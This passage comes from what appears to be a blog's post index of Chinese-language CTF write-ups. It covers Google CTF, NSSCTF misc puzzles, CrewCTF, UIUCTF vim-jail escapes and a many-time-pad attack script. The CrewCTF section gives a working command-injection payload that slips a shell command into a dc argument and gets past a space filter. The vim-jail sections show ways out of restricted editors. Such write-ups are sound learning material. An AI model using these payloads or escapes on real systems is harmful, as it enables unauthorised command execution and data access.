class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>]) || !<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$username</span>) || !<span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$password</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Please provide username and password as string&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$tier</span> = <span class=\"title function_ invoke__\">getUserTier</span>(<span class=\"variable\">$username</span>, <span class=\"variable\">$password</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$tier</span> === <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Invalid credentials&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$response</span> = <span class=\"string\">&quot;Login successful. Welcome &quot;</span> . <span class=\"title function_ invoke__\">htmlspecialchars</span>(<span class=\"variable\">$username</span>) . <span class=\"string\">&quot;.&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$tier</span> === <span class=\"string\">&quot;gold&quot;</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$response</span> .= <span class=\"string\">&quot; &quot;</span> . <span class=\"title function_ invoke__\">getenv</span>(<span class=\"string\">&quot;FLAG&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$response</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过代码分析，在php的服务上，只要让<code>tier=gold</code>就输出flag。</p>\n<p>可以在注册账号的时候传两个tier。</p>\n<p>flask识别第一个tier，php识别第二个tier，注册完后在php服务登录得到falg。</p>\n<p>其他的太难了，看都看不懂</p>\n<p><a href=\"http://blog.xmcve.com/2023/06/26/Google-CTF-2023-Writeup/\">http://blog.xmcve.com/2023/06/26/Google-CTF-2023-Writeup/</a></p>\n<p>可以看这个</p>\n","categories":["ctf","复盘"],"tags":["ctf"]},{"title":"NSSCTF MISC刷题","url":"/2023/01/24/NSSCTF-MISC%E5%88%B7%E9%A2%98/","content":"<h1 id=\"SWPUCTF-2021-新生赛-我的银行卡密码\"><a href=\"#SWPUCTF-2021-新生赛-我的银行卡密码\" class=\"headerlink\" title=\"[SWPUCTF 2021 新生赛]我的银行卡密码\"></a>[SWPUCTF 2021 新生赛]我的银行卡密码</h1><p><img src=\"/pic/%E6%88%91%E7%9A%84%E9%93%B6%E8%A1%8C%E5%8D%A1%E5%AF%86%E7%A0%81.png\"><br>压缩包有密码，而且是6位数。用ARCHPR破解，密码是<code>768521</code>。</p>\n<span id=\"more\"></span>\n<p>解压之后是一个md文件<br><img src=\"/pic/pwd.png\"><br>直接就懵了，看别人的wp后发现是用手机的九宫格解密的，还是写的少，涨知识了。<br>解出来之后是<code>YLOPJOGJVOCCYNMZYPGXGPOGJDVIGATBASH</code><br>后面的<code>ATBASH</code>就是提示<br>将<code>YLOPJOGJVOCCYNMZYPGXGPOGJDVIG</code>进行ATBASH解密，得到<code>BOLKQLTQELXXBMNABKTCTKLTQWERT</code>，后面的<code>QWERT</code>就是QWERT加密，也是个提示。<br>将<code>BOLKQLTQELXXBMNABKTCTKLT</code>进行QWERT解密，得到<code>XISRASEACSUUXZYKXREVERSE</code>,后面的reverse还是个提示得到<code>XKYZXUUSCAESARSIX</code>,caesar six也是个提示凯撒密码6，得到<code>RESTROOM</code>，最后在RESERVE一下<code>NSSCTF&#123;moortser&#125;</code>就是flag。</p>\n<h1 id=\"SWPU-2019-漂流记的马里奥\"><a href=\"#SWPU-2019-漂流记的马里奥\" class=\"headerlink\" title=\"[SWPU 2019]漂流记的马里奥\"></a>[SWPU 2019]漂流记的马里奥</h1><p>点开exe文件出现一个1.txt<br><img src=\"/pic/maliao.png\"><br>提示是ntfs，可以用<code>NtfsStreamsEditor2</code><br>或者<br>膜拜xenny大佬<br>cmd转到文件地址，命令行notepad 1.txt:flag.txt<br>最后的flag是<code>NSSCTF&#123;ddg_is_cute&#125;</code></p>\n<h1 id=\"SWPUCTF-2021-新生赛-gif好像有点大\"><a href=\"#SWPUCTF-2021-新生赛-gif好像有点大\" class=\"headerlink\" title=\"[SWPUCTF 2021 新生赛]gif好像有点大\"></a>[SWPUCTF 2021 新生赛]gif好像有点大</h1><p>下载文件后是个GIF图，用<code>STEG SOLVE</code>打开，在第562帧的时候有一个二维码，扫码就是flag <code>NSSCTF&#123;The_G1F_ls_T00_b1g&#125;</code></p>\n<h1 id=\"HUBUCTF-2022-新生赛-最简单的misc\"><a href=\"#HUBUCTF-2022-新生赛-最简单的misc\" class=\"headerlink\" title=\"[HUBUCTF 2022 新生赛]最简单的misc\"></a>[HUBUCTF 2022 新生赛]最简单的misc</h1><p>用<code>stegsolve</code>打开，LSB隐写，得到一个二维码，然后扫码之后就是flag:<code>NSSCTF&#123;aacc4238460996f0178c18d7637c9dd5&#125;</code></p>\n<p>唉！misc题写的恶心，就是跟作者对脑电波嘛。</p>\n","categories":["MISC","NSSCTF","刷题"],"tags":["刷题","MISC","NSSCTF"]},{"title":"CrewCTF","url":"/2023/07/11/CrewCTF/","content":"<h1 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h1><h2 id=\"sequence-gallery\"><a href=\"#sequence-gallery\" class=\"headerlink\" title=\"sequence_gallery\"></a>sequence_gallery</h2><p>下载附件</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#main.py</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> sqlite3</span><br><span class=\"line\"><span class=\"keyword\">import</span> subprocess</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, request, render_template</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.get(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">\tsequence = request.args.get(<span class=\"string\">&#x27;sequence&#x27;</span>, <span class=\"literal\">None</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> sequence <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;index.html&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\tscript_file = os.path.basename(sequence + <span class=\"string\">&#x27;.dc&#x27;</span>) <span class=\"comment\">#构造脚本名,将sequence和.dc字符串连接起来，并获取路径中的文件名部分。</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"string\">&#x27; &#x27;</span> <span class=\"keyword\">in</span> script_file <span class=\"keyword\">or</span> <span class=\"string\">&#x27;flag&#x27;</span> <span class=\"keyword\">in</span> script_file:</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"string\">&#x27;:(&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tproc = subprocess.run(     <span class=\"comment\">#运行dc命令</span></span><br><span class=\"line\">\t\t[<span class=\"string\">&#x27;dc&#x27;</span>, script_file], </span><br><span class=\"line\">\t\tcapture_output=<span class=\"literal\">True</span>,</span><br><span class=\"line\">\t\ttext=<span class=\"literal\">True</span>,</span><br><span class=\"line\">\t\ttimeout=<span class=\"number\">1</span>,</span><br><span class=\"line\">\t)</span><br><span class=\"line\">\toutput = proc.stdout</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;index.html&#x27;</span>, output=output)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\tapp.run(host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>, port=<span class=\"number\">8080</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">subprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, capture_output=False, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None, text=None, env=None, universal_newlines=None)</span><br><span class=\"line\"></span><br><span class=\"line\">args：表示要执行的命令。必须是一个字符串，字符串参数列表。</span><br><span class=\"line\">stdin、stdout 和 stderr：子进程的标准输入、输出和错误。其值可以是 subprocess.PIPE、subprocess.DEVNULL、一个已经存在的文件描述符、已经打开的文件对象或者 None。subprocess.PIPE 表示为子进程创建新的管道。subprocess.DEVNULL 表示使用 os.devnull。默认使用的是 None，表示什么都不做。另外，stderr 可以合并到 stdout 里一起输出。</span><br><span class=\"line\">timeout：设置命令超时时间。如果命令执行时间超时，子进程将被杀死，并弹出 TimeoutExpired 异常。</span><br><span class=\"line\">check：如果该参数设置为 True，并且进程退出状态码不是 0，则弹 出 CalledProcessError 异常。</span><br><span class=\"line\">encoding: 如果指定了该参数，则 stdin、stdout 和 stderr 可以接收字符串数据，并以该编码方式编码。否则只接收 bytes 类型的数据。</span><br><span class=\"line\">shell：如果该参数为 True，将通过操作系统的 shell 执行指定的命令。</span><br></pre></td></tr></table></figure>\n\n<p>在<code>subprocess.run()</code>中<code>shell</code>没等于<code>TRUE</code>但是容易受到参数的影响</p>\n<p><img src=\"/pic/CrewCTF/web1.png\"></p>\n<p>在kali里用man命令看dc的文档</p>\n<p><img src=\"/pic/CrewCTF/web1.1.png\"></p>\n<p>用<code>-e</code>和<code>!</code>可以执行命令,空格被过滤了，用其他符号绕过，在最后需要加上<code>%0a</code>表示输入了ENTER</p>\n<p>payload:<code>?sequence=-e$&#123;IFS&#125;!cat$&#123;IFS&#125;*.txt%0A</code></p>\n<p>得到flag:<code>crew&#123;10 63 67 68 101 107 105 76 85 111 68[dan10!=m]smlmx&#125; </code></p>\n<p>放到kali里用dc命令转换为真实的flag</p>\n<p><img src=\"/pic/CrewCTF/web1.2.png\"></p>\n","categories":["ctf","复盘"],"tags":["ctf"]},{"title":"UIUCTF2023","url":"/2023/07/04/UIUCTF023/","content":"<h1 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h1><h2 id=\"vimjail1\"><a href=\"#vimjail1\" class=\"headerlink\" title=\"vimjail1\"></a>vimjail1</h2><p>这道题一连接就是插入模式，想办法退出插入模式.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#entry.sh</span><br><span class=\"line\">#!/usr/bin/env sh</span><br><span class=\"line\"></span><br><span class=\"line\">chmod -r /flag.txt</span><br><span class=\"line\"></span><br><span class=\"line\">vim -R -M -Z -u /home/user/vimrc</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>以只读、文本不可修改、限制模式、启动并且用<code>/home/user/vimrc</code>替代了原有的.vimrc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#vimrc</span><br><span class=\"line\">set nocompatible</span><br><span class=\"line\">set insertmode</span><br><span class=\"line\"># 禁用了兼容模式，并且默认启动插入模式</span><br><span class=\"line\">inoremap &lt;c-o&gt; nope</span><br><span class=\"line\">inoremap &lt;c-l&gt; nope</span><br><span class=\"line\">inoremap &lt;c-z&gt; nope</span><br><span class=\"line\">inoremap &lt;c-\\&gt;&lt;c-n&gt; nope</span><br><span class=\"line\"># 将这些组合键转换为插入单词nope</span><br></pre></td></tr></table></figure>\n\n<p>但是可以按两次<code>ctrl+\\</code>再按一次<code>ctrl+n</code>来绕过，然后用<code>:e</code>来读取flag。</p>\n<p><code>:e</code>表示编辑一个文件</p>\n<p><img src=\"/pic/uiu/vim1.png\"></p>\n<h2 id=\"vimjail2\"><a href=\"#vimjail2\" class=\"headerlink\" title=\"vimjail2\"></a>vimjail2</h2><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#entry.sh</span></span><br><span class=\"line\"><span class=\"comment\">#!/usr/bin/env sh</span></span><br><span class=\"line\"></span><br><span class=\"line\">vim -R -M -Z -u /home/user/vimrc -i /home/user/viminfo</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> /flag.txt</span><br></pre></td></tr></table></figure>\n\n<p>以只读模式、文本不可修改、限制模式启动vim，替换了原有的vimrc和viminfo</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#vimrc</span><br><span class=\"line\">set nocompatible</span><br><span class=\"line\">set insertmode</span><br><span class=\"line\"></span><br><span class=\"line\">inoremap &lt;c-o&gt; nope</span><br><span class=\"line\">inoremap &lt;c-l&gt; nope</span><br><span class=\"line\">inoremap &lt;c-z&gt; nope</span><br><span class=\"line\">inoremap &lt;c-\\&gt;&lt;c-n&gt; nope</span><br><span class=\"line\"></span><br><span class=\"line\">cnoremap a _</span><br><span class=\"line\">cnoremap b _</span><br><span class=\"line\">cnoremap c _</span><br><span class=\"line\">cnoremap d _</span><br><span class=\"line\">cnoremap e _</span><br><span class=\"line\">cnoremap f _</span><br><span class=\"line\">cnoremap g _</span><br><span class=\"line\">cnoremap h _</span><br><span class=\"line\">cnoremap i _</span><br><span class=\"line\">cnoremap j _</span><br><span class=\"line\">cnoremap k _</span><br><span class=\"line\">cnoremap l _</span><br><span class=\"line\">cnoremap m _</span><br><span class=\"line\">cnoremap n _</span><br><span class=\"line\">cnoremap o _</span><br><span class=\"line\">cnoremap p _</span><br><span class=\"line\">cnoremap r _</span><br><span class=\"line\">cnoremap s _</span><br><span class=\"line\">cnoremap t _</span><br><span class=\"line\">cnoremap u _</span><br><span class=\"line\">cnoremap v _</span><br><span class=\"line\">cnoremap w _</span><br><span class=\"line\">cnoremap x _</span><br><span class=\"line\">cnoremap y _</span><br><span class=\"line\">cnoremap z _</span><br><span class=\"line\">cnoremap ! _</span><br><span class=\"line\">cnoremap @ _</span><br><span class=\"line\">cnoremap # _</span><br><span class=\"line\">cnoremap $ _</span><br><span class=\"line\">cnoremap % _</span><br><span class=\"line\">cnoremap ^ _</span><br><span class=\"line\">cnoremap &amp; _</span><br><span class=\"line\">cnoremap * _</span><br><span class=\"line\">cnoremap - _</span><br><span class=\"line\">cnoremap + _</span><br><span class=\"line\">cnoremap = _</span><br><span class=\"line\">cnoremap ` _</span><br><span class=\"line\">cnoremap ~ _</span><br><span class=\"line\">cnoremap &#123; _</span><br><span class=\"line\">cnoremap &#125; _</span><br><span class=\"line\">cnoremap [ _</span><br><span class=\"line\">cnoremap ] _</span><br><span class=\"line\">cnoremap \\| _</span><br><span class=\"line\">cnoremap \\ _</span><br><span class=\"line\">cnoremap ; _</span><br><span class=\"line\">cnoremap &lt; _</span><br><span class=\"line\">cnoremap &gt; _</span><br><span class=\"line\">cnoremap , _</span><br><span class=\"line\">cnoremap . _</span><br><span class=\"line\">cnoremap / _</span><br><span class=\"line\">cnoremap ? _</span><br></pre></td></tr></table></figure>\n\n<p>将所有字符都转换成了下划线，绕过方式还是两次<code>ctrl+\\</code>+<code>ctrl+n</code>，entry.sh中最后有一个<code>cat /flag</code>,这意味着退出vim后会打印出flag.</p>\n<p><code>:q</code>即可。</p>\n<h2 id=\"Corny-Kernel\"><a href=\"#Corny-Kernel\" class=\"headerlink\" title=\"Corny Kernel\"></a>Corny Kernel</h2><p>附件给了一个c文件</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> pr_fmt(fmt) KBUILD_MODNAME <span class=\"string\">&quot;: &quot;</span> fmt</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/module.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/init.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/kernel.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"type\">const</span> <span class=\"type\">char</span> *flag1, *flag2;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> __init <span class=\"title function_\">pwny_init</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tpr_alert(<span class=\"string\">&quot;%s\\n&quot;</span>, flag1);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> __exit <span class=\"title function_\">pwny_exit</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tpr_info(<span class=\"string\">&quot;%s\\n&quot;</span>, flag2);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">module_init(pwny_init);</span><br><span class=\"line\">module_exit(pwny_exit);</span><br><span class=\"line\"></span><br><span class=\"line\">MODULE_AUTHOR(<span class=\"string\">&quot;Nitya&quot;</span>);</span><br><span class=\"line\">MODULE_DESCRIPTION(<span class=\"string\">&quot;UIUCTF23&quot;</span>);</span><br><span class=\"line\">MODULE_LICENSE(<span class=\"string\">&quot;GPL&quot;</span>);</span><br><span class=\"line\">MODULE_VERSION(<span class=\"string\">&quot;0.1&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>下面的代码的意思是当加载模块的时候输出第一段flag</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> __init <span class=\"title function_\">pwny_init</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tpr_alert(<span class=\"string\">&quot;%s\\n&quot;</span>, flag1);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">module_init(pwny_init); #这行代码将 pwny_init 函数注册为模块的初始化函数。在模块加载时，该函数将被调用。</span><br></pre></td></tr></table></figure>\n\n<p>首先用<code>gzip -d pwnymodule.ko.gz</code>，然后用<code>insmod pwnymodule.ko</code>加载这个模块，加载完成后会输出第一串flag。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> __exit <span class=\"title function_\">pwny_exit</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tpr_info(<span class=\"string\">&quot;%s\\n&quot;</span>, flag2);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">module_exit(pwny_exit);   #这行代码将 pwny_exit 函数注册为模块的退出函数。在模块被卸载时，该函数将被调用来执行清理操作。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这一串代码的意思是这个模块在被卸载的时候输出第二段flag,用<code>rmmod pwnymodule.ko</code>这个卸载模块,然后用<code>dmesg</code>输出内核的信息，在最后会输出两段flag。</p>\n<h2 id=\"vimjail1-5\"><a href=\"#vimjail1-5\" class=\"headerlink\" title=\"vimjail1.5\"></a>vimjail1.5</h2><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#entry.sh</span></span><br><span class=\"line\"><span class=\"comment\">#!/usr/bin/env sh</span></span><br><span class=\"line\"></span><br><span class=\"line\">vim -R -M -Z -u /home/user/vimrc</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#vimrc</span><br><span class=\"line\">set nocompatible</span><br><span class=\"line\">set insertmode</span><br><span class=\"line\"></span><br><span class=\"line\">inoremap &lt;c-o&gt; nope</span><br><span class=\"line\">inoremap &lt;c-l&gt; nope</span><br><span class=\"line\">inoremap &lt;c-z&gt; nope</span><br><span class=\"line\">inoremap &lt;c-\\&gt; nope</span><br></pre></td></tr></table></figure>\n\n<p>别的没变，但是之前的方法没用了，用<code>ctrl+r</code>这个用于执行撤销和重做操作。然后用<code>=execute(readfile(&#39;flag.txt&#39;))</code></p>\n<p><code>=</code> 是用于执行表达式的命令。<code>execute()</code>：<code>execute()</code> 函数用于执行 Vim 命令。<code>readfile(&#39;flag.txt&#39;)</code>：使用 Vim 的内置函数 <code>readfile()</code> 读取名为 <code>flag.txt</code> 的文件内容，并返回一个包含文件内容的列表。就是将flag.txt里面的内容变成命令执行,然后就会报错</p>\n<p><img src=\"/pic/uiu/vim1.5.png\"></p>\n<p>或者，用<code>=execute(&#39;:e flag.txt&#39;)</code>然后按两次回车。</p>\n<h2 id=\"vimjail2-5\"><a href=\"#vimjail2-5\" class=\"headerlink\" title=\"vimjail2.5\"></a>vimjail2.5</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#vimrc</span><br><span class=\"line\">set nocompatible</span><br><span class=\"line\">set insertmode</span><br><span class=\"line\"></span><br><span class=\"line\">inoremap &lt;c-o&gt; nope</span><br><span class=\"line\">inoremap &lt;c-l&gt; nope</span><br><span class=\"line\">inoremap &lt;c-z&gt; nope</span><br><span class=\"line\">inoremap &lt;c-\\&gt; nope</span><br><span class=\"line\"></span><br><span class=\"line\">cnoremap a _</span><br><span class=\"line\">cnoremap b _</span><br><span class=\"line\">cnoremap c _</span><br><span class=\"line\">cnoremap d _</span><br><span class=\"line\">cnoremap e _</span><br><span class=\"line\">cnoremap f _</span><br><span class=\"line\">cnoremap g _</span><br><span class=\"line\">cnoremap h _</span><br><span class=\"line\">cnoremap i _</span><br><span class=\"line\">cnoremap j _</span><br><span class=\"line\">cnoremap k _</span><br><span class=\"line\">cnoremap l _</span><br><span class=\"line\">cnoremap m _</span><br><span class=\"line\">cnoremap n _</span><br><span class=\"line\">cnoremap o _</span><br><span class=\"line\">cnoremap p _</span><br><span class=\"line\">cnoremap r _</span><br><span class=\"line\">cnoremap s _</span><br><span class=\"line\">cnoremap t _</span><br><span class=\"line\">cnoremap u _</span><br><span class=\"line\">cnoremap v _</span><br><span class=\"line\">cnoremap w _</span><br><span class=\"line\">cnoremap x _</span><br><span class=\"line\">cnoremap y _</span><br><span class=\"line\">cnoremap z _</span><br><span class=\"line\">cnoremap ! _</span><br><span class=\"line\">cnoremap @ _</span><br><span class=\"line\">cnoremap # _</span><br><span class=\"line\">cnoremap $ _</span><br><span class=\"line\">cnoremap % _</span><br><span class=\"line\">cnoremap ^ _</span><br><span class=\"line\">cnoremap &amp; _</span><br><span class=\"line\">cnoremap * _</span><br><span class=\"line\">cnoremap - _</span><br><span class=\"line\">cnoremap + _</span><br><span class=\"line\">cnoremap = _</span><br><span class=\"line\">cnoremap ` _</span><br><span class=\"line\">cnoremap ~ _</span><br><span class=\"line\">cnoremap &#123; _</span><br><span class=\"line\">cnoremap &#125; _</span><br><span class=\"line\">cnoremap [ _</span><br><span class=\"line\">cnoremap ] _</span><br><span class=\"line\">cnoremap \\| _</span><br><span class=\"line\">cnoremap \\ _</span><br><span class=\"line\">cnoremap ; _</span><br><span class=\"line\">cnoremap &lt; _</span><br><span class=\"line\">cnoremap &gt; _</span><br><span class=\"line\">cnoremap , _</span><br><span class=\"line\">cnoremap . _</span><br><span class=\"line\">cnoremap / _</span><br><span class=\"line\">cnoremap ? _</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这个只能输入<code>:q</code>，方法基本上差不多，还是<code>ctrl+r</code>然后<code>=</code>,按<code>TAB</code>键可以补全内置代码，然后找到<code>execute</code>，最后的命令是<code>execute(&quot;:q&quot;)</code>，后会输出flag。</p>\n<h1 id=\"crypto\"><a href=\"#crypto\" class=\"headerlink\" title=\"crypto\"></a>crypto</h1><h2 id=\"Three-Time-Pad\"><a href=\"#Three-Time-Pad\" class=\"headerlink\" title=\"Three-Time Pad\"></a>Three-Time Pad</h2><p><a href=\"http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/\">http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/</a></p>\n<p>看这篇博客，用他的脚本可以解出这道题</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"comment\">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span></span><br><span class=\"line\"><span class=\"comment\"># @author intrd - http://dann.com.br/ </span></span><br><span class=\"line\"><span class=\"comment\"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> collections</span><br><span class=\"line\"><span class=\"keyword\">import</span> sets, sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span></span><br><span class=\"line\">c1 = <span class=\"string\">&quot;14f5f95b4a252948a8aef177d6c92d82e3016362bd7463f41f40a00ad9e0ccad911b959ef8dfad5f1cc4481ecb64&quot;</span></span><br><span class=\"line\">c2 = <span class=\"string\">&quot;06e2f65a4c256d0ba8ada164cecd329cae436069f83476e91757e91bd4a4cce2c60a8f9aac8cb14210d55253cd787c0f6a&quot;</span></span><br><span class=\"line\">c3 = <span class=\"string\">&quot;03f9ea574c267249b2b1ef5d91cd3c99904a3f75873871e94157df0fcbb5d1eab94f9386&quot;</span></span><br><span class=\"line\">ciphers = [c1, c2, c3]</span><br><span class=\"line\"><span class=\"comment\"># The target ciphertext we want to crack</span></span><br><span class=\"line\">target_cipher = <span class=\"string\">&quot;03f9ea574c267249b2b1ef5d91cd3c99904a3f75873871e94157df0fcbb5d1eab94f9386&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># XORs two string</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">strxor</span>(<span class=\"params\">a, b</span>):     <span class=\"comment\"># xor two strings (trims the longer input)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;</span>.join([<span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(x) ^ <span class=\"built_in\">ord</span>(y)) <span class=\"keyword\">for</span> (x, y) <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(a, b)])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># To store the final key</span></span><br><span class=\"line\">final_key = [<span class=\"literal\">None</span>]*<span class=\"number\">150</span></span><br><span class=\"line\"><span class=\"comment\"># To store the positions we know are broken</span></span><br><span class=\"line\">known_key_positions = <span class=\"built_in\">set</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># For each ciphertext</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> current_index, ciphertext <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(ciphers):</span><br><span class=\"line\">\tcounter = collections.Counter()</span><br><span class=\"line\">\t<span class=\"comment\"># for each other ciphertext</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> index, ciphertext2 <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(ciphers):</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> current_index != index: <span class=\"comment\"># don&#x27;t xor a ciphertext with itself</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> indexOfChar, char <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(strxor(ciphertext.decode(<span class=\"string\">&#x27;hex&#x27;</span>), ciphertext2.decode(<span class=\"string\">&#x27;hex&#x27;</span>))): <span class=\"comment\"># Xor the two ciphertexts</span></span><br><span class=\"line\">\t\t\t\t<span class=\"comment\"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&#x27;t know which one)</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> char <span 